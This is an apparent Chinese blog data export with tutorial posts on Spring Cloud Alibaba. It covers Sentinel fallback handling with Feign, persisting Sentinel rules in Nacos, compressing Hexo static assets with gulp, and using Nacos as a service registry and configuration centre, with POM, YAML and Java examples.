&lt;dependency&gt;&lt;!-- 引入自己定义的api通用包，可以使用Payment支付Entity --&gt; &lt;groupId&gt;com.atguigu.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;!-- SpringBoot整合Web组件 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--日常通用jar包配置--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt;&lt;/dependencies&gt; yml 12345678910111213141516server: port: 9003spring: application: name: nacos-payment-provider cloud: nacos: discovery: server-addr: localhost:8848 #配置Nacos地址management: endpoints: web: exposure: include: '*' 记得修改不同的端口号 主启动 123456789101112131415package com.atguigu.springcloud.alibaba;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.client.discovery.EnableDiscoveryClient;@SpringBootApplication@EnableDiscoveryClientpublic class PaymentMain9003&#123; public static void main(String[] args) &#123; SpringApplication.run(PaymentMain9003.class, args); &#125;&#125; 业务类 12345678910111213141516171819202122232425262728293031package com.atguigu.springcloud.alibaba.controller;import com.atguigu.springcloud.alibaba.entities.CommonResult;import com.atguigu.springcloud.alibaba.entities.Payment;import org.springframework.beans.factory.annotation.Value;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RestController;import java.util.HashMap;@RestControllerpublic class PaymentController&#123; @Value(\"$&#123;server.port&#125;\") private String serverPort; public static HashMap&lt;Long, Payment&gt; hashMap = new HashMap&lt;&gt;(); static&#123; hashMap.put(1L,new Payment(1L,\"28a8c1e3bc2742d8848569891fb42181\")); hashMap.put(2L,new Payment(2L,\"bba8c1e3bc2742d8848569891ac32182\")); hashMap.put(3L,new Payment(3L,\"6ua8c1e3bc2742d8848569891xt92183\")); &#125; @GetMapping(value = \"/paymentSQL/&#123;id&#125;\") public CommonResult&lt;Payment&gt; paymentSQL(@PathVariable(\"id\") Long id)&#123; Payment payment = hashMap.get(id); CommonResult&lt;Payment&gt; result = new CommonResult(200,\"from mysql,serverPort: \"+serverPort,payment); return result; &#125;&#125; 测试地址 1http:&#x2F;&#x2F;localhost:9003&#x2F;paymentSQL&#x2F;1 消费者84 新建cloudalibaba-consumer-nacos-order84 POM 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.atguigu.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt;&lt;/dependencies&gt; YML 123456789101112131415161718server: port: 84spring: application: name: nacos-order-consumer cloud: nacos: discovery: server-addr: localhost:8848 sentinel: transport: dashboard: localhost:8080 port: 8719service-url: nacos-user-service: http://nacos-payment-provider 主启动 1234567891011121314151617package com.atguigu.springcloud.alibaba;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.client.discovery.EnableDiscoveryClient;import org.springframework.cloud.openfeign.EnableFeignClients;@EnableDiscoveryClient@SpringBootApplication@EnableFeignClientspublic class OrderNacosMain84&#123; public static void main(String[] args) &#123; SpringApplication.run(OrderNacosMain84.class, args); &#125;&#125; 业务类 ApplicationContextConfig 123456789101112131415161718package com.atguigu.springcloud.alibaba.config;import org.springframework.cloud.client.loadbalancer.LoadBalanced;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.web.client.RestTemplate;@Configurationpublic class ApplicationContextConfig&#123; @Bean @LoadBalanced public RestTemplate getRestTemplate() &#123; return new RestTemplate(); &#125;&#125; CircleBreakerController的全部源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556package com.atguigu.springcloud.alibaba.controller;import com.alibaba.csp.sentinel.annotation.SentinelResource;import com.alibaba.csp.sentinel.slots.block.BlockException;import com.atguigu.springcloud.alibaba.entities.CommonResult;import com.atguigu.springcloud.alibaba.entities.Payment;import lombok.extern.slf4j.Slf4j;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import org.springframework.web.client.RestTemplate;import javax.annotation.Resource;@RestController@Slf4jpublic class CircleBreakerController &#123; public static final String SERVICE_URL = \"http://nacos-payment-provider\"; @Resource private RestTemplate restTemplate; @RequestMapping(\"/consumer/fallback/&#123;id&#125;\") //@SentinelResource(value = \"fallback\") //没有配置 //@SentinelResource(value = \"fallback\",fallback = \"handlerFallback\") //fallback只负责业务异常 //@SentinelResource(value = \"fallback\",blockHandler = \"blockHandler\") //blockHandler只负责sentinel控制台配置违规 @SentinelResource(value = \"fallback\",fallback = \"handlerFallback\",blockHandler = \"blockHandler\", exceptionsToIgnore = &#123;IllegalArgumentException.class&#125;) public CommonResult&lt;Payment&gt; fallback(@PathVariable Long id) &#123; CommonResult&lt;Payment&gt; result = restTemplate.getForObject(SERVICE_URL + \"/paymentSQL/\"+id, CommonResult.class,id); if (id == 4) &#123; throw new IllegalArgumentException (\"IllegalArgumentException,非法参数异常....\"); &#125;else if (result.getData() == null) &#123; throw new NullPointerException (\"NullPointerException,该ID没有对应记录,空指针异常\"); &#125; return result; &#125; //fallback public CommonResult handlerFallback(@PathVariable Long id,Throwable e) &#123; Payment payment = new Payment(id,\"null\"); return new CommonResult&lt;&gt;(444,\"兜底异常handlerFallback,exception内容 \"+e.getMessage(),payment); &#125; //blockHandler public CommonResult blockHandler(@PathVariable Long id,BlockException blockException) &#123; Payment payment = new Payment(id,\"null\"); return new CommonResult&lt;&gt;(445,\"blockHandler-sentinel限流,无此流水: blockException \"+blockException.getMessage(),payment); &#125;&#125; 修改后请重启微服务 热部署对java代码级生效及时 对@SentinelResource注解内属性，有时效果不好 目的 fallback管运行异常 blockHandler管配置违规 测试地址 http://localhost:84/consumer/fallback/1 没有任何配置 给客户error页面，不友好 只配置fallback 编码（那个业务类下面的CircleBreakerController的全部源码） 只配置blockHandler 编码（那个业务类下面的CircleBreakerController的全部源码） fallback和blockHandler都配置 结果 忽略属性… 编码（那个业务类下面的CircleBreakerController的全部源码） Feign系列修改84模块 POM 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;&lt;/dependency&gt; yml 1234567891011121314151617181920212223server: port: 84spring: application: name: nacos-order-consumer cloud: nacos: discovery: server-addr: localhost:8848 sentinel: transport: dashboard: localhost:8080 port: 8719service-url: nacos-user-service: http://nacos-payment-provider#对Feign的支持feign: sentinel: enabled: true 业务类 带@FeignClient注解的业务接口 12345678910111213141516package com.atguigu.springcloud.alibaba.service;import com.atguigu.springcloud.alibaba.entities.CommonResult;import com.atguigu.springcloud.alibaba.entities.Payment;import org.springframework.cloud.openfeign.FeignClient;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PathVariable;@FeignClient(value = \"nacos-payment-provider\",fallback = PaymentFallbackService.class)public interface PaymentService&#123; @GetMapping(value = \"/paymentSQL/&#123;id&#125;\") public CommonResult&lt;Payment&gt; paymentSQL(@PathVariable(\"id\") Long id);&#125; fallback = PaymentFallbackService.class PaymentFallbackService实现类 123456789101112131415package com.atguigu.springcloud.alibaba.service;import com.atguigu.springcloud.alibaba.entities.CommonResult;import com.atguigu.springcloud.alibaba.entities.Payment;import org.springframework.stereotype.Component;@Componentpublic class PaymentFallbackService implements PaymentService&#123; @Override public CommonResult&lt;Payment&gt; paymentSQL(Long id) &#123; return new CommonResult&lt;&gt;(44444,\"服务降级返回,---PaymentFallbackService\",new Payment(id,\"errorSerial\")); &#125;&#125; Controller 12345678// OpenFeign@Resourceprivate PaymentService paymentService;@GetMapping(value = \"/consumer/paymentSQL/&#123;id&#125;\")public CommonResult&lt;Payment&gt; paymentSQL(@PathVariable(\"id\") Long id) &#123; return paymentService.paymentSQL(id);&#125; 主启动 添加@EnableFeignClients启动Feign的功能 12345678910111213141516package com.atguigu.springcloud.alibaba;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.client.discovery.EnableDiscoveryClient;import org.springframework.cloud.openfeign.EnableFeignClients;@EnableDiscoveryClient@SpringBootApplication@EnableFeignClientspublic class OrderNacosMain84&#123; public static void main(String[] args) &#123; SpringApplication.run(OrderNacosMain84.class, args); &#125;&#125; http://lcoalhost:84/consumer/openfeign/1 http://lcoalhost:84/consumer/paymentSQL/1 测试84调用9003，此时故意关闭9003微服务提供者，看84消费侧自动降级，不会被耗死 熔断框架比较 规则持久化是什么一旦我们重启应用，Sentinel规则将消失，生产环境需要将配置规则进行持久化 怎么玩将限流配置规则持久化进Nacos保存，只要刷新8401某个rest地址，sentinel控制台的流控规则就能看到，只要Nacos里面的配置不删除，针对8401上Sentinel上的流控规则持续有效 步骤修改cloudalibaba-sentinel-service8401 POM 1234&lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-datasource-nacos&lt;/artifactId&gt;&lt;/dependency&gt; YML 1234567891011121314151617181920212223242526272829303132server: port: 8401spring: application: name: cloudalibaba-sentinel-service cloud: nacos: discovery: server-addr: localhost:8848 #Nacos服务注册中心地址 sentinel: transport: dashboard: localhost:8080 #配置Sentinel dashboard地址 port: 8719 datasource: ds1: nacos: server-addr: localhost:8848 dataId: cloudalibaba-sentinel-service groupId: DEFAULT_GROUP data-type: json rule-type: flowmanagement: endpoints: web: exposure: include: '*'feign: sentinel: enabled: true # 激活Sentinel对Feign的支持 添加Nacos数据源配置 1234567891011spring: cloud: sentinel: datasource: ds1: nacos: server-addr:localhost:8848 dataid:$&#123;spring.application.name&#125; groupid:DEFAULT_GROUP data-type:json rule-type:flow 添加Nacos业务规则配置 内容解析 1234567891011[ &#123; \"resource\": \"/retaLimit/byUrl\", \"limitApp\": \"default\", \"grade\": 1, \"count\": 1, \"strategy\": 0, \"controlBehavior\": 0, \"clusterMode\": false &#125;] 启动8401后刷新sentinel发现业务规则有了 快速访问测试接口 http://localhost:8401/rateLimit/byUrl 默认 停止8401再看sentinel 重新启动8401再看sentinel: 扎一看还是没有，稍等一会儿 多次调用 http://localhost:8401/rateLimit/byUrl 重新配置出现了，持久化验证通过","categories":[{"name":"分布式","slug":"分布式","permalink":"https://kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://kayleh.top/tags/DistributedMicroservices/"}]},{"title":"gulp压缩静态资源","slug":"gulp压缩静态资源","date":"2020-08-23T19:28:18.000Z","updated":"2021-04-11T17:11:28.502Z","comments":true,"path":"gulp-compresses-static-resources/","link":"","permalink":"https://kayleh.top/gulp-compresses-static-resources/","excerpt":"hexo","text":"hexo Gulp基于Node.js的前端构建工具，通过Gulp的插件可以实现前端代码的编译（sass、less）、压缩、测试；图片的压缩；浏览器自动刷新; 安装依赖在根目录下:1234567npm install gulp --savenpm install gulp-minify-css --savenpm install gulp-uglify --savenpm install gulp-htmlmin --savenpm install gulp-htmlclean --savenpm install gulp-imagemin --save 创建文件gulpfile.js:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// 引入需要的模块var gulp = require('gulp');var minifycss = require('gulp-minify-css');var uglify = require('gulp-uglify');var htmlmin = require('gulp-htmlmin');var htmlclean = require('gulp-htmlclean');var imagemin = require('gulp-imagemin');// 压缩public目录下所有html文件, minify-html是任务名, 设置为default，启动gulp压缩的时候可以省去任务名gulp.task('minify-html', function() &#123; return gulp.src('./public/**/*.html') // 压缩文件所在的目录 .pipe(htmlclean()) .pipe(htmlmin(&#123; removeComments: true, minifyJS: true, minifyCSS: true, minifyURLs: true, &#125;)) .pipe(gulp.dest('./public')) // 输出的目录&#125;);// 压缩cssgulp.task('minify-css', function() &#123; return gulp.src('./public/**/*.css') .pipe(minifycss(&#123; compatibility: 'ie8' &#125;)) .pipe(gulp.dest('./public'));&#125;);// 压缩jsgulp.task('minify-js', function() &#123; return gulp.src(['./public/**/.js','!./public/js/**/*min.js']) .pipe(uglify()) .pipe(gulp.dest('./public'));&#125;);// 压缩图片gulp.task('minify-images', function() &#123; return gulp.src(['./public/**/*.png','./public/**/*.jpg','./public/**/*.gif']) .pipe(imagemin( [imagemin.gifsicle(&#123;'optimizationLevel': 3&#125;), //imagemin.mozjpeg(&#123;'progressive': true&#125;), imagemin.jpegtran(&#123;'progressive': true&#125;), imagemin.optipng(&#123;'optimizationLevel': 7&#125;), imagemin.svgo()], &#123;'verbose': true&#125;)) .pipe(gulp.dest('./public'))&#125;);// gulp 4.0 适用的方式gulp.task('default', gulp.parallel('minify-html','minify-css','minify-js','minify-images' //build the website)); 运行 1hexo clean &amp;&amp; hexo g &amp;&amp; gulp default &amp;&amp; hexo s 完成对静态资源的压缩。 注意：压缩静态资源时，CPU占用率会很高。 如果出现一下错误： 1TypeError: imagemin.jpegtran is not a function at D:\\Blog\\gulpfile.js:41:18 at minify-images (D:\\Blog\\node_modules\\undertaker\\lib\\set-task.js:13:15) at bound (domain.js:419:14) at runBound (domain.js:432:12) at asyncRunner (D:\\Blog\\node_modules\\async-done\\index.js:55:18) at processTicksAndRejections (internal&#x2F;process&#x2F;task_queues.js:76:11) 修改文件gulpfile.js 123imagemin.jpegtran(&#123;'progressive': true&#125;)修改为imagemin.mozjpeg(&#123;'progressive': true&#125;)","categories":[],"tags":[{"name":"front","slug":"front","permalink":"https://kayleh.top/tags/front/"}]},{"title":"Nacos服务注册和配置中心","slug":"Nacos服务注册和配置中心","date":"2020-08-21T01:44:55.000Z","updated":"2021-04-11T17:11:28.341Z","comments":true,"path":"nacos-service-registration-and-configuration-center/","link":"","permalink":"https://kayleh.top/nacos-service-registration-and-configuration-center/","excerpt":"Nacos","text":"Nacos 一个更易于构建云原生应用的动态服务发现，配置管理和服务管理中心 Nacos：Dynamic Naming and Configuration Service Nacos就是注册中心+配置中心的组合等价于 Nacos = Eureka+Config+Bus 能干嘛 替代Eureka做服务注册中心 替代Config做服务配置中心 https://github.com/alibaba/Nacos https://nacos.io/zh-cn/index.html https://spring-cloud-alibaba-group.github.io/github-pages/greenwich/spring-cloud-alibaba.html#_spring_cloud_alibaba_nacos_discovery 各种注册中心比较 安装并运行Nacos1本地Java8+Maven环境已经OK 2先从官网下载Nacos https://github.com/alibaba/nacos/releases/tag/1.1.4 3解压安装包，直接运行bin目录下的startup.cmd 4命令运行成功后直接访问 http://localhost:8848/nacos 默认账号密码都是nacos 结果页面 Nacos作为服务注册中心演示基于Nacos的服务提供者新建Module cloudalibaba-provider-payment9001 父POM 12345678&lt;!--spring cloud alibaba 2.1.0.RELEASE--&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-alibaba-dependencies&lt;/artifactId&gt; &lt;version&gt;2.1.0.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt;&lt;/dependency&gt; 本模块POM 12345678910111213141516171819202122232425262728293031323334&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.62&lt;/version&gt;&lt;/dependency&gt; &lt;/dependencies&gt; yaml 12345678910111213141516server: port: 9001spring: application: name: nacos-payment-provider cloud: nacos: discovery: server-addr: localhost:8848 #配置Nacos地址management: endpoints: web: exposure: include: '*' 主启动类 12345678910111213package com.kayleh.springcloud.alibaba;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.client.discovery.EnableDiscoveryClient;@EnableDiscoveryClient@SpringBootApplicationpublic class PaymentMain9001 &#123; public static void main(String[] args) &#123; SpringApplication.run(PaymentMain9001.class,args); &#125;&#125; 业务类 12345678910111213141516171819package com.kayleh.springcloud.alibaba.controller;import org.springframework.beans.factory.annotation.Value;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class PaymentController&#123; @Value(\"$&#123;server.port&#125;\") private String serverPort; @GetMapping(value = \"/payment/nacos/&#123;id&#125;\") public String getPayment(@PathVariable(\"id\") Integer id) &#123; return \"nacos registry, serverPort: \"+ serverPort+\"\\t id\"+id; &#125;&#125; 测试 1http:&#x2F;&#x2F;localhost:9001&#x2F;payment&#x2F;nacos&#x2F;1 nacos控制台 nacos服务注册中心+服务提供者9001都ok了 为了演示nacos的负载均衡，参照9001新建9002 新建 cloudalibaba-provider-payment9002 9002其他步骤你懂的 或者取巧不想新建重复体力劳动，直接拷贝虚拟端口映射 基于Nacos的服务消费者新建Module cloudalibaba-consumer-nacos-order83 POM 123456789101112131415161718192021222324252627282930313233343536&lt;dependencies&gt; &lt;!--SpringCloud ailibaba nacos --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 为什么nacos支持负载均衡 yaml 12345678910111213server: port: 83spring: application: name: nacos-order-consumer cloud: nacos: discovery: server-addr: localhost:8848service-url: nacos-user-service: http://nacos-payment-provider 主启动 12345678910111213141516package com.kayleh.springcloud.alibaba;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.client.discovery.EnableDiscoveryClient;@EnableDiscoveryClient@SpringBootApplicationpublic class OrderNacosMain83&#123; public static void main(String[] args) &#123; SpringApplication.run(OrderNacosMain83.class,args); &#125;&#125; 业务类 ApplicationContextBean 123456789101112131415161718package com.kayleh.springcloud.alibaba.config;import org.springframework.cloud.client.loadbalancer.LoadBalanced;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.web.client.RestTemplate;@Configurationpublic class ApplicationContextConfig&#123; @Bean @LoadBalanced public RestTemplate getRestTemplate() &#123; return new RestTemplate(); &#125;&#125; OrderNacosController 12345678910111213141516171819202122232425262728package com.kayleh.springcloud.alibaba.controller;import lombok.extern.slf4j.Slf4j;import org.springframework.beans.factory.annotation.Value;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RestController;import org.springframework.web.client.RestTemplate;import javax.annotation.Resource;@RestController@Slf4jpublic class OrderNacosController&#123; @Resource private RestTemplate restTemplate; @Value(\"$&#123;service-url.nacos-user-service&#125;\") private String serverURL; @GetMapping(value = \"/consumer/payment/nacos/&#123;id&#125;\") public String paymentInfo(@PathVariable(\"id\") Long id) &#123; return restTemplate.getForObject(serverURL+\"/payment/nacos/\"+id,String.class); &#125;&#125; 测试 nacos控制台 访问 http://localhost:83/consumer/payment/nacos/13 83访问9001/9002，轮询负载OK 服务注册中心对比各种注册中心对比 Nacos全景图所示 Nacos和CAP Nacos支持AP和CP模式的切换 1curl -X PUT &#39;$NACOS_SERVER:8848&#x2F;nacos&#x2F;v1&#x2F;ns&#x2F;operator&#x2F;switches?entry&#x3D;serverMode&amp;value&#x3D;CP&#39; Nacos作为服务配置中心演示Nacos作为配置中心-基础配置cloudalibaba-config-nacos-client3377 POM 1234567891011121314151617181920212223242526272829303132333435363738&lt;dependencies&gt; &lt;!--nacos-config--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--nacos-discovery--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--web + actuator--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--一般基础配置--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt;&lt;/dependencies&gt; YML 为什么配置两个 bootstrap 12345678910111213server: port: 3377spring: application: name: nacos-config-client cloud: nacos: discovery: server-addr: localhost:8848 #服务注册中心地址 config: server-addr: localhost:8848 #配置中心地址 file-extension: yaml #指定yaml格式的配置 application 123spring: profiles: active: dev 主启动类 123456789101112131415package com.kayleh.springcloud.alibaba;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.client.discovery.EnableDiscoveryClient;@EnableDiscoveryClient@SpringBootApplicationpublic class NacosConfigClientMain3377&#123; public static void main(String[] args) &#123; SpringApplication.run(NacosConfigClientMain3377.class, args); &#125;&#125; 业务类 ConfigClientController 1234567891011121314151617181920package com.kayleh.springcloud.alibaba.controller;import org.springframework.beans.factory.annotation.Value;import org.springframework.cloud.context.config.annotation.RefreshScope;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RestController;@RestController@RefreshScopepublic class ConfigClientController&#123; @Value(\"$&#123;config.info&#125;\") private String configInfo; @GetMapping(\"/config/info\") public String getConfigInfo() &#123; return configInfo; &#125;&#125; @RefreshScope 在Nacos中添加配置信息Nacos中的匹配规则理论 Nacos中的dataid的组成格式与SpringBoot配置文件中的匹配规则 https://nacos.io/zh-cn/docs/quick-start-spring-cloud.html 实操 1.配置新增 nacos-config-client-dev 2.Nacos界面配置对应 12config: info: nacos config center,version &#x3D; 1,from nacos config center, nacos-config-client-dev.yaml, version&#x3D;1 设置DataId 公式: ${spring.application.name}-${spring.profile.active}.${spring.cloud.nacos.config.file-extension} prefix默认为spring.application.name的值 spring.profile.active既为当前环境对应的profile,可以通过配置项spring.profile.active 来配置 file-exetension为配置内容的数据格式，可以通过配置项spring.cloud.nacos.config.file-extension配置 总结: 3.历史配置 测试启动前需要在nacos客户端-配置管理-配置管理栏目下有没有对应的yaml配置文件 运行cloud-config-nacos-client3377的主启动类 调用接口查看配置信息 http://localhost:3377/config/info 自带动态刷新修改下Nacos中的yaml配置文件，再次调用查看配置的接口，就会发现配置已经刷新 Nacos作为配置中心-分类配置问题 多环境多项目管理 Nacos的图形化管理界面 配置管理 命名空间 Namespace+Group+Data ID三者关系？为什么这么设计？ Case一、DataID方案 指定spring.profile.active和配置文件的DataID来使不同环境下读取不同的配置 默认空间+默认分组+新建dev和test两个DataID 新建dev配置DataID 新建test配置DataID 通过spring.profile.active属性就能进行多环境下配置文件的读取 测试 http://localhost:3377/config/info 配置是什么就加载什么 test 二、Group方案通过Group实现环境区分 新建Group 在nacos图形界面控制台上面新建配置文件DataID bootstrap+application 在config下增加一条group的配置即可。可配置为DEV_GROUP或TEST_GROUP 三、Namespace方案新建dev/test的Namespace 回到服务管理-服务列表查看 按照域名配置填写 YML bootstrap 1namespace: application Nacos集群和持久化配置是什么？ https://nacos.io/zh-cn/docs/cluster-mode-quick-start.html 按照上述，我们需要mysql数据库 https://nacos.io/zh-cn/docs/deployment.html Nacos持久化配置解释Nacos默认自带的是嵌入式数据库derby https://github.com/alibaba/nacos/blob/develop/config/pom.xml derby到mysql切换配置步骤 nacos-server-1.1.4\\nacos\\conf目录下找到sql脚本 nacos-mysql.sql 执行脚本 